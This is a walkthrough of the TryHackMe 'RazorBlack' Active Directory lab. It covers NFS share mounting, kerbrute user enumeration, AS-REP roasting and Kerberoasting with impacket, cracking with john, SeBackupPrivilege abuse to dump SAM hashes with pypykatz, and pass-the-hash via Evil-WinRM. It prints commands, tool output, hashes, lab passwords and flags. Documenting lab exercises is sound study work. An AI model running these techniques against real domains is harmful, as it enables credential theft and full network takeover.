---
title: RazorBlack
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - showmount
  - mount
  - kerbrute
  - asreproasting
  - impacket-getnpusers
  - smbpasswd
  - kerberoasting
  - impacket-getuserspns
  - john
  - smbmap
  - evil-winrm
  - sebackupprivilege
  - reg
  - pypykatz
  - import-clixml
  - type
  - hex 
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-razorblack/
---

This [room](https://tryhackme.com/room/raz0rblack) is aimed toward show casing us how companies use NFS instead of SMB and feel safer for them self. but in case the reality is diff. and we are easily able to mount this file system and fetch files from it. analysis of found file leads us to valid users using kerbrute and next perform an AS-REP roasting attack. further with new user privileges we are allowed to perform Kerberoasting attack and have access to a privilege account. enumerating a little gives us that this account has `SeBackupPrivilege` privileges and thus we can easily dump SAM database using 2 methods. although this room suppose to be a medium room but enumeration for flag levels it up a lit.

* Walkthroughs
  * [https://medium.com/@mudassir-ansari/tryhackme-razorblack-49f9ca392755](https://medium.com/@mudassir-ansari/tryhackme-razorblack-49f9ca392755)
  * [https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f](https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f)
  * [https://korbinian-spielvogel.de/posts/razorblack-writeup/](https://korbinian-spielvogel.de/posts/razorblack-writeup/)
  * [https://j-info.github.io/ctfsite/walkthroughs/2022-05-16-RazorBlack.html](https://j-info.github.io/ctfsite/walkthroughs/2022-05-16-RazorBlack.html)

## Enumeration

### Nmap

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p 53,88,135,111,139,593,636,2049,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49673,49674,49678,49693,49704 -A 10.10.166.83
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-07 02:49 PDT
Nmap scan report for 10.10.166.83
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-07 09:49:33Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2023-06-06T09:46:44
|_Not valid after:  2023-12-06T09:46:44
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-07T09:50:26+00:00
|_ssl-date: 2023-06-07T09:50:38+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.17 seconds
```

* found nothing on DNS, SMB and RPC.
* from LDAP we cloud only query for FQDN that is `raz0rblack.thm` , but no more information was able to be retrieved as we were not able to successfully bind to it. (as we were unauthenticated)
* also from port 3389 (RDP) we got the name of a computer `HAVEN-DC` which basically seems to be a Domain controller as the name suggest.
* interestingly here we have RPCBind on port 111.

### NFS - 2049

* from RPCBind info in nmap we found we have NFS open.
* on port 2049 we have `nlockmgr` which is NFS for windows and only supports NFSv3.
* enumerate for available mounts and we got following:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ showmount -e 10.10.166.83         
Export list for 10.10.166.83:
/users (everyone)
```

* thus lets attack the mount point and look into it further more.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo mkdir /mnt/users

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo mount -t nfs 10.10.166.83:/users /mnt/users
```

* **NOTE: we need to be root to enter the mounted filesystem.**
* we found 2 files in the mount and so for further enumeration we copied it to our machine.

```bash
┌──(root㉿kali)-[/mnt/users]
└─# ls -la
total 17
drwx------ 2 nobody nogroup   64 Feb 27  2021 .
drwxr-xr-x 3 root   root    4096 Jun  7 03:05 ..
-rwx------ 1 nobody nogroup 9861 Feb 25  2021 employee_status.xlsx
-rwx------ 1 nobody nogroup   80 Feb 25  2021 sbradley.txt
                                                                                                                                                              
┌──(root㉿kali)-[/mnt/users]
└─# cp employee_status.xlsx /home/kali/Desktop 
                                                                                                                                                              
┌──(root㉿kali)-[/mnt/users]
└─# cp sbradley.txt /home/kali/Desktop/
```

* in the `sbradley.txt` file it contents a flag.

```bash
┌──(kali㉿kali)-[~/Desktop/RazorBlack]
└─$ sudo cat sbradley.txt 
[sudo] password for kali: 
��THM{ab53e05c9a98def00314a14ccbfa8104}
```

* and for `employee_status.xlsx` file we have a CTF players list.

![](2025-05-31-razorblack-2.png)

* this cloud be used as a list of potential usernames.
* also we got that the earlier found file belong to user `steven bradley` and thus holds his flag.
* plus from this we now know that `ljudmila vetrova` is a Domain Admin.

### Kerberos - 88

* as the kerberos port is open we can perform username enumeration by brute force method using [kerberute](https://github.com/TarlogicSecurity/kerbrute).
* for this we need a username list with permutation of naming contexts.
* but as we have a slight hint from before about what type of naming context is used on target domain.
* from `sbradley.txt` we see it using `(f)(lastname)` syntax.
* thus we create such a permutation for all found usernames.

```bash
┌──(kali㉿kali)-[~/Desktop/RazorBlack]
└─$ ./../opt/Windows/kerbrute_linux_amd64 userenum --dc 10.10.166.83 -d raz0rblack.thm usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/07/23 - Ronnie Flathers @ropnop

2023/06/07 03:41:55 >  Using KDC(s):
2023/06/07 03:41:55 >  	10.10.166.83:88

2023/06/07 03:41:56 >  [+] VALID USERNAME:	 lvetrova@raz0rblack.thm
2023/06/07 03:41:56 >  [+] VALID USERNAME:	 twilliams@raz0rblack.thm
2023/06/07 03:41:56 >  [+] VALID USERNAME:	 sbradley@raz0rblack.thm
2023/06/07 03:41:56 >  Done! Tested 24 usernames (3 valid) in 0.772 seconds
```

* Yayy, we found 3 users.
* one is a Domain Admin, second a Web specialist and last one a `STEGO` specialist.
* as we have no more attack surface left for us to enumerate we will try AS-REP roasting attack to get hash of a user who is set for `UF_DONT_REQUIRE_PREAUTH`.

```bash
┌──(kali㉿kali)-[~/Desktop/RazorBlack]
└─$ impacket-GetNPUsers raz0rblack.thm/ -usersfile found_users.txt -format john   
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$twilliams@RAZ0RBLACK.THM:a7a8c49202ec549652c550e5a3723133$d1b67b3a0821fcd3b37ab99d29c764b689c27b25aef78efae70013c8b3510ef07136388e7e868828c8bb5114c5cb7df812b97defc34a45eda5872029b2c4230933d3683a06dc0b48f61ac0712692783827396fe293e5ec01c391753cc9fd8177f1e4f51843ce021a45b98e67b2212985f4a81c635fdd91a3447c8fc8d68ac32d158edf8e386f73ce21ad8989bc033c263c5499a250414080579531807835368665be4107c0462ec8a570ce723e9a2f08d317932bbe0882c0e0e7aeb94c77f9223e9f41387004876a0e48797dfb51bc9da533deffe6c3fe7279f3aac79f511a91af8d695c39868b4ddbada857868f42d0
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

* pasted the hash in a text file and crack it using john.

![](2025-05-31-razorblack-3.png)

* thus got the full creds - `twilliams:roastpotatoes`

## Exploitation

* with this new creds with can now check for our access on SMB.

![](2025-05-31-razorblack-4.png)

* good we see it has an unusual share named `trash`.
* plus we have now read only access on IPC$, NETLOGON and SYSVOL.
* thus as We have now access to IPC$ we can fetch for all usernames.

![](2025-05-31-razorblack-5.png)

* next we can also try to brute force and see that if any other user has the same password or not.
* save all usernames to a file users.txt and make a file pass.txt with the password of the previous user.

![](2025-05-31-razorblack-6.png)

* For the user `sbradley` we find an interesting message `STATUS_PASSWORD_MUST_CHANGE`.
* This means that The specified password is correct but expried. thus we need to change the password.
* (for changing password we will give Old password as the same as above speciifed on)

```bash
smbpasswd -r $IP -U sbradley
Old SMB password: roastpotatoes
New SMB password: testing
Retype new SMB password: testing
Password changed for user sbradley on 10.10.25.3
```

![](2025-05-31-razorblack-7.png)

* for next we tried to obtain a shell on target using several methods but got no success.
* thus over last resolve - Kerberoasting Attack.

![](2025-05-31-razorblack-8.png)

* and we have a krbtgs hash for user account `xyan1d3`
* cracked it using john.

![](2025-05-31-razorblack-9.png)

* thus creds are `xyan1d3:cyanide9amine5628`
* again checked for new access privileges on SMB and found we have now read/write access on C$ and read only access on ADMIN$ share.

![](2025-05-31-razorblack-10.png)

* thus we can now get a shell using psexec.
* but no luck, thus also tried with other methods too including RDP but all failed.
* lastly we were able to get shell using Evil-WinRm.

![](2025-05-31-razorblack-11.png)

* from here in current user home directory we found a xml file and so fetch it.

![](2025-05-31-razorblack-12.png)

* enumerate for basic privileges.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

* [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
* thus made a copy of SAM and SYSTEM from registry.

![](2025-05-31-razorblack-13.png)

* next transfered it to our machine.

![](2025-05-31-razorblack-14.png)

* next on our machine we dump the hashes using `pypykatz`.

```bash
┌──(kali㉿kali)-[~/Desktop/RazorBlack]
└─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: f1582a79dd00631b701d3d15e75e59f6
============== SAM hive secrets ==============
HBoot Key: eaa05099b2f12f633fca797270e3e4fa10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

* and we have administrators hash.
* but instead of cracking we will directly pass it and get a shell using Evil-WinRm.

![](2025-05-31-razorblack-15.png)

* and we are in.
* from here we collect root flag.

```bash
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


*Evil-WinRM* PS C:\Users\Administrator> download root.xml
                                        
Info: Downloading C:\Users\Administrator\root.xml to root.xml
                                        
Info: Download successful!
```

## Flags

* for this we see none of the users have flags in their Desktop directory.
* but instead they have a .xml file in there home directory.

### **lvetrova**

* in lvetrova home directory we find a .xml file which seems to have a username and password.
* researching it found that it a powershell technique to save user credentials (username and password) to a file.
* but this are not stored in clear text.
* [https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file](https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file)
* [https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8](https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8)
* to see this creds we can use powershell’s inbuilt module `Clixml`.
* which can be use to export credential xml file into memory and then read it.
* **NOTE: we need to be the as lvetrova user to do this.**

```powershell
*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}
```

### **xyanld3**

* we need to login as xyanld3 user to do this.

```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

### **twilliams**

* looking in Tyson Williams (twilliams) home folder.

```powershell
*Evil-WinRM* PS C:\users\twilliams> dir


    Directory: C:\users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe
```

* we have a executable here saying its not a flag.
* but the file seems very small to be an executable, let’s see if we can look at the contents.

```powershell
*Evil-WinRM* PS C:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}
```

**root**

* for root too we have the same file as xyanld3 and lvetrova.
* but the password string in it looks different.
* downloaded all the file and viewed the content.

![](2025-05-31-razorblack-16.png)

* it looks like hex encoded string.
* thus went to [cyberchef.org](https://cyberchef.org/) and paste in the password string in the input field.
* next from operation selected hex and drag it to recipe and `BAKE`.

![](2025-05-31-razorblack-17.png)

```
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

### **What is the complete top secret?**

* After moving through the directories we find a folder named `"C:\Program Files\Top Secret"`
* There is an image in that folder. We can download it and analyze it for the flag.

![](2025-05-31-razorblack-18.png)

* It’s pretty obvious by seeing the picture that the answer here is `:wq`
